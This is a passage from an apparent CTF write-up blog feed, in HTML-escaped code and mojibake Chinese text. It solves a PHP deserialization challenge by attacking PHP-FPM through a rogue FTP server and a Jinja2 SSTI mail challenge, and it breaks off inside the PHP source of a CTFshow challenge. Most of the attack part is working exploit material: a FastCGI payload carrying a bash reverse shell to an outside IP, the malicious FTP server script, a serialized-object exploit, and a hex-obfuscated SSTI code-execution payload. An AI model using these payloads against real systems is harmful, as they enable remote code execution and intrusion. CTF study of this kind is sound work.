&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;code&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªé¢˜ï¼Œæ€Žä¹ˆè¯´ è¿˜æ˜¯æˆ‘å¤ªå¹´è½»äº† æˆ‘ä»¥ä¸ºè¿™ä¸ªå°±æ˜¯ç®€å•çš„ååºåˆ—åŒ–+shellå†™å…¥ï¼Œç„¶åŽéžå¸¸çš„ç–‘æƒ‘ä¸ºå•¥æœ¬åœ°å¯ä»¥ä½†æ˜¯è¿œç¨‹çš„shellæ­»æ´»å°±æ˜¯ä¸è½åœ°ï¼Œä¸€ç›´åœ¨æƒ³æ€Žä¹ˆç»•è¿‡ï¼Œè¿™æ˜¯å½“æ—¶å°è¯•çš„exp.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Check&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">$str2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$filename&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$username&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$str4&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Check&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$esle&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bypass&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75715e">// $bypass -&amp;gt; str4 = &amp;#39;phpinfo&amp;#39;;
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">$bypass&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$welcome&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$welcome&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$bunny&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;op.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$bunny&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;xyz&amp;#34;&lt;/span>
&lt;span style="color:#111">$payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$esle&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç›´åˆ°èµ›åŽæ‰çŸ¥é“è¿™åˆåˆåˆæ˜¯fpmï¼Œéœ€è¦ç”¨ftpæ‰“fpmï¼Œå…·ä½“çš„å†…å®¹æˆ‘æœ€è¿‘ä¹Ÿæ­£åœ¨æ€»ç»“ï¼Œå¯ä»¥å‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/11/15/attack-php-fpm-study-notes/">æ”»å‡» PHP-FPM å­¦ä¹ ç¬”è®°&lt;/a>ï¼ˆè¿˜æ²¡å…¨éƒ¨æ”¶å°¾ï¼‰&lt;/p>
&lt;p>é¦–å…ˆæ˜¯ä¾æ®pç‰›çš„è„šæœ¬ç”Ÿæˆä¸€ä¸ªurlencodeçš„payloadï¼ˆè¿™é‡Œå¼•å·æœ‰é—®é¢˜çš„è¯ç›´æŽ¥æ”¹è„šæœ¬å§ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python fpm.py 127.0.0.1 &lt;span style="color:#d88200">&amp;#39;/var/www/html/index.php&amp;#39;&lt;/span> -c &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exec(&amp;#34;bash -c \&amp;#39;&lt;/span>/bin/bash -i &amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span> /dev/tcp/101.35.114.107/8426 0&amp;gt;&lt;span style="color:#111">&amp;amp;&lt;/span>1&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">&amp;#34;);?&amp;gt;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽå¼€ä¸€ä¸ªæ¶æ„çš„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">8001&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 welcome&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Service ready for new user.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous username&lt;/span>
&lt;span style="color:#75715e">#USER anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User name okay, need password.&lt;/span>
&lt;span style="color:#75715e">#Client send anonymous password.&lt;/span>
&lt;span style="color:#75715e">#PASS anonymous&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#User logged in, proceed. Logged out if appropriate.&lt;/span>
&lt;span style="color:#75715e">#TYPE I&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#Size /&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;550 Could not get the file size.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#EPSV (1)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 ok&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#PASV&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Extended Passive Mode (127,0,0,1,0,9000)&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">#STOR / (2)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Permission denied.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e">#QUIT&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;endd&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¿®æ”¹ä¹‹å‰çš„ååºåˆ—åŒ–exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;xxxxxxxxxxxxxxxxxx&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ftp://101.35.114.107:8001/aaa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bunny&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">str4&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Welcome&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Esle&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Bypass&lt;/span>&lt;span style="color:#111">())));&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>getæ–¹å¼ä¼ å…¥ï¼ŒåŒæ—¶vpsä¸Šå¼€ä¸€ä¸ªftp-serverå’Œä¸€ä¸ªç›‘å¬åå¼¹shellçš„ç«¯å£ï¼Œå³å¯æ‹¿flag&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211116141329800.png" alt="image-20211116141329800">&lt;/p>
&lt;h2 id="magicmail">MagicMail&lt;/h2>
&lt;p>åŽŸé¢˜ï¼Œsstiå¥—å£³ï¼Œå‚è§-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/#webmega-mailer">[DeconstruCTF 2021]Mega Mailer&lt;/a>ï¼Œä½†æ˜¯æ¯”èµ›çš„æ—¶å€™æˆ‘æ²¡å‡ºï¼Œæ˜¯æˆ‘çš„é—®é¢˜ï¼Œå¹³æ—¶æ‹¿çŽ°æˆçš„payloadæ¢­æƒ¯äº†ï¼Œè‡ªå·±æž„é€ çš„æ—¶å€™å°±éœ²äº†æ€¯&lt;/p>
&lt;p>payloadçš„æž„é€ å‚è§-&amp;gt;&lt;a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses&lt;/a>ï¼Œä½¿ç”¨&lt;code>attr()&lt;/code>+hexå­—ç¬¦ä¸²çš„æ–¹å¼æŠŠåŸºç¡€payloadç»™æ‹¼å‡ºæ¥&lt;/p>
&lt;pre tabindex="0">&lt;code>sender=&amp;amp;receiver=&amp;amp;subject=&amp;amp;message={{()|attr(&amp;quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&amp;quot;)()|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(180)|attr(&amp;quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&amp;quot;)|attr(&amp;quot;\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f&amp;quot;)(&amp;quot;\x65\x76\x61\x6c&amp;quot;)(&amp;quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x27\x29\x2e\x72\x65\x61\x64\x28\x29&amp;quot;)}}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åŽŸæœ¬çš„æ ·å­&lt;/span>
&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__class__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__base__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">subclasses&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">180&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;cat /flag&amp;#39;).read()&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>CTFshow1121å‡»å‰‘æ¯ Wp</title><link>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</link><pubDate>Tue, 16 Nov 2021 03:00:57 +0800</pubDate><guid>https://amiaaaz.github.io/2021/11/16/ctfshow-1121-jjcup-wp/</guid><description>&lt;h2 id="ç»™æˆ‘çœ‹çœ‹">ç»™æˆ‘çœ‹çœ‹&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">require_once&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">whoami&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$name&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$your_answer&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$useless&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfshowç¬¬ä¸€æ·±æƒ…&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;Only you know&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">useless&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;I_love_u&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$you_never_know&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">your_answer&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;s&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ç»™æˆ‘çœ‹çœ‹!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$secret&lt;/span>&lt;span style="color:#f92672">===&lt;/span>&lt;span style="color:#d88200">&amp;#34;ç»™æˆ‘çœ‹çœ‹!&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
